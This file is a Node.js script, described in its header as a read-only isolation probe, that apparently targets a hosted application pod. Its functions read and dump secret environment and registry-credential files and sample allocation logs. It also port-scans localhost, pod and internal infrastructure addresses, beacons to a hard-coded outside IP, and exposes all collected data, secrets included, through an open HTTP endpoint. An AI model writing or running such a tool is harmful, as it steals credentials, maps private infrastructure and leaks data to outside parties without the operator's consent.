// w13app-live probe v3: pod-internal reachability + isolation, read-only
const http = require('http');
const net = require('net');
const dns = require('dns');
const fs = require('fs');
const os = require('os');
const { execFileSync } = require('child_process');

const SECRET = 'w13app-d7982f79';
const PROBE_PATH = '/' + SECRET;
const CALLBACK = 'http://169.58.237.50/' + SECRET;

function rd(p, max = 6000) { try { return fs.readFileSync(p).toString('utf8').slice(0, max); } catch (e) { return 'ERR: ' + e.code; } }
function lsdir(p) { try { return fs.readdirSync(p); } catch (e) { return 'ERR: ' + e.code; } }
function st(p) { try { const s = fs.statSync(p); return { mode: (s.mode & 0o7777).toString(8), size: s.size, uid: s.uid, gid: s.gid, isSocket: s.isSocket(), isDir: s.isDirectory(), isFifo: s.isFIFO() }; } catch (e) { return 'ERR: ' + e.code; } }
function sh(cmd, args) { try { return execFileSync(cmd, args, { timeout: 4000, maxBuffer: 1 << 20 }).toString().slice(0, 4000); } catch (e) { return 'ERR: ' + (e.stderr ? e.stderr.toString().slice(0, 400) : String(e).slice(0, 200)); } }

function tcp(host, port, ms = 1000) {
  return new Promise((res) => {
    const s = net.connect({ host, port });
    const done = (r) => { try { s.destroy(); } catch (_) {} res({ target: host + ':' + port, ...r }); };
    const t = setTimeout(() => done({ result: 'timeout' }), ms);
    s.on('connect', () => { clearTimeout(t); done({ result: 'open' }); });
    s.on('error', (e) => { clearTimeout(t); done({ result: 'err', code: e.code }); });
  });
}
function httpGet(u, headers = {}, ms = 2500) {
  return new Promise((res) => {
    const t = setTimeout(() => res({ url: u, err: 'timeout' }), ms);
    try {
      const r = http.get(u, { headers, timeout: ms }, (resp) => {
        let b = ''; resp.on('data', (d) => { if (b.length < 400) b += d; });
        resp.on('end', () => { clearTimeout(t); res({ url: u, status: resp.statusCode, headers: resp.headers, body: b.slice(0, 400) }); });
      });
      r.on('error', (e) => { clearTimeout(t); res({ url: u, err: e.code || String(e) }); });
      r.on('timeout', () => { clearTimeout(t); r.destroy(); res({ url: u, err: 'timeout' }); });
    } catch (e) { clearTimeout(t); res({ url: u, err: String(e) }); }
  });
}
function unixRaw(sock, ms = 1500) {
  return new Promise((res) => {
    const s = net.connect({ path: sock });
    const t = setTimeout(() => { try { s.destroy(); } catch (_) {} res({ connect: 'timeout' }); }, ms);
    s.on('connect', () => { clearTimeout(t); try { s.destroy(); } catch (_) {} res({ connect: 'ok' }); });
    s.on('error', (e) => { clearTimeout(t); res({ connect: 'err', code: e.code }); });
  });
}
async function chunked(items, n, fn) {
  const out = [];
  for (let i = 0; i < items.length; i += n) out.push(...await Promise.all(items.slice(i, i + n).map(fn)));
  return out;
}

const DATA = { probe_version: 'v3', started: new Date().toISOString(), host: os.hostname() };
const PORTS = [80, 443, 3000, 3001, 4317, 4318, 5000, 8000, 8080, 8081, 8443, 8500, 8888, 9000, 9090, 9091, 9901, 9999, 15000, 15001, 15021, 4646, 8200, 2375, 2376, 10250];

function collect() {
  DATA.id = sh('id', []);
  DATA.caps = sh('grep', ['-E', 'Cap|Seccomp|NoNewPrivs', '/proc/self/status']);
  DATA.proc_count = (() => { try { return fs.readdirSync('/proc').filter((x) => /^\d+$/.test(x)); } catch (e) { return 'ERR'; } })();
  DATA.hosts = rd('/etc/hosts', 2500);
  DATA.resolv = rd('/etc/resolv.conf', 400);
  DATA.ifaces = os.networkInterfaces();
  DATA.dev = { listing: lsdir('/dev'), net_tun: st('/dev/net/tun'), fuse: st('/dev/fuse'), kvm: st('/dev/kvm'), mem: st('/dev/mem') };
  DATA.sys = { cgroup: lsdir('/sys/fs/cgroup'), cgroup_w: (() => { try { fs.accessSync('/sys/fs/cgroup', fs.constants.W_OK); return true; } catch (e) { return 'no:' + e.code; } })() };
  DATA.secrets = {
    ls_la: sh('sh', ['-c', 'ls -la /secrets 2>&1; echo ---Z---; ls -laZ /secrets 2>&1; echo ---SOCK---; ls -laZ /secrets/api.sock 2>&1']),
    stat: {}, read: {}, dir_w: (() => { try { fs.accessSync('/secrets', fs.constants.W_OK); return 'W_OK yes'; } catch (e) { return 'W_OK no:' + e.code; } })(),
  };
  for (const f of ['/secrets', '/secrets/run.env', '/secrets/registry-auth.env', '/secrets/api.sock', '/run/secrets']) DATA.secrets.stat[f] = st(f);
  for (const f of ['/secrets/run.env', '/secrets/registry-auth.env']) {
    try { const fd = fs.openSync(f, 'r'); DATA.secrets.read[f] = { open: 'ok', fstat: fs.fstatSync(fd).size, data: fs.readFileSync(fd).toString('utf8').slice(0, 500) }; fs.closeSync(fd); }
    catch (e) { DATA.secrets.read[f] = { open: 'ERR', code: e.code, errno: e.errno }; }
  }
  DATA.alloc = { logs: lsdir('/alloc/logs'), samples: {} };
  for (const d of (Array.isArray(DATA.alloc.logs) ? DATA.alloc.logs : [])) {
    if (d.endsWith('.fifo')) continue;
    DATA.alloc.samples[d] = rd('/alloc/logs/' + d, 2500);
  }
  DATA.mounts_sel = (rd('/proc/self/mountinfo', 12000)).split('\n').filter((l) => /secrets|alloc|local|overlay /.test(l)).map((l) => l.slice(0, 400));
  DATA.writes = {
    tmp_marker: (() => { try { fs.writeFileSync('/tmp/w13-v3-marker.txt', 'v3-' + new Date().toISOString()); return 'ok'; } catch (e) { return 'ERR ' + e.code; } })(),
    tmp_marker_preexisting: rd('/tmp/w13-v3-marker.txt', 100),
  };
  DATA.scan_secrets = sh('sh', ['-c', 'ls -la /secrets/ 2>&1 | head -20; echo ---; cat /secrets/* 2>&1 | head -20']);
}

function beacon(phase) {
  const payload = Buffer.from(JSON.stringify({ phase, host: os.hostname(), v: 'v3' })).toString('base64').replace(/[^A-Za-z0-9]/g, '').slice(0, 400);
  http.get(CALLBACK + '/' + phase + '/' + payload, { timeout: 4000 }, (r) => r.resume()).on('error', () => {});
}

const server = http.createServer((req, res) => {
  if (req.url.startsWith(PROBE_PATH)) { res.writeHead(200, { 'content-type': 'application/json' }); res.end(JSON.stringify(DATA, null, 1)); return; }
  res.writeHead(404); res.end('nf');
});

(async () => {
  collect();
  beacon('boot');
  DATA.sock_connect = await unixRaw('/secrets/api.sock');
  // pod-internal reachability
  const hosts = ['127.0.0.1', '10.132.0.105', '169.254.1.2'];
  const targets = [];
  for (const h of hosts) for (const p of PORTS) targets.push([h, p]);
  DATA.local_scan = await chunked(targets, 12, ([h, p]) => tcp(h, p, 900));
  DATA.local_open = DATA.local_scan.filter((x) => x.result === 'open');
  DATA.local_open_probe = [];
  for (const o of DATA.local_open) {
    const [h, p] = o.target.split(':');
    DATA.local_open_probe.push(await httpGet('http://' + h + ':' + p + '/'));
  }
  // internal aiven infra IPv6 (from /etc/hosts) — limited ports
  const infra = (DATA.hosts || '').split('\n').filter((l) => /aiven-application-infrastructure/.test(l)).map((l) => l.trim().split(/\s+/)[0]);
  DATA.infra_hosts = infra;
  const it = [];
  for (const ip of infra) for (const p of [80, 443, 3000, 8080, 4646, 8500]) it.push([ip, p]);
  DATA.infra_scan = await chunked(it, 12, ([h, p]) => tcp(h, p, 900));
  DATA.infra_open = DATA.infra_scan.filter((x) => x.result === 'open');
  DATA.infra_open_probe = [];
  for (const o of DATA.infra_open.slice(0, 6)) {
    const [h, p] = o.target.split(':');
    DATA.infra_open_probe.push(await httpGet('http://' + h + ':' + p + '/'));
  }
  // public egress baseline
  DATA.egress = await chunked([['1.1.1.1', 443], ['161.35.91.60', 443], ['165.232.94.55', 9092], ['api.aiven.io', 443]], 4, ([h, p]) => tcp(h, p, 2500));
  DATA.dns_api = await new Promise((r) => dns.lookup('api.aiven.io', { all: true }, (e, a) => r(e ? e.code : a)));
  DATA.finished = new Date().toISOString();
  beacon('done');
  server.listen(3000, '0.0.0.0', () => console.log('v3 up'));
})();
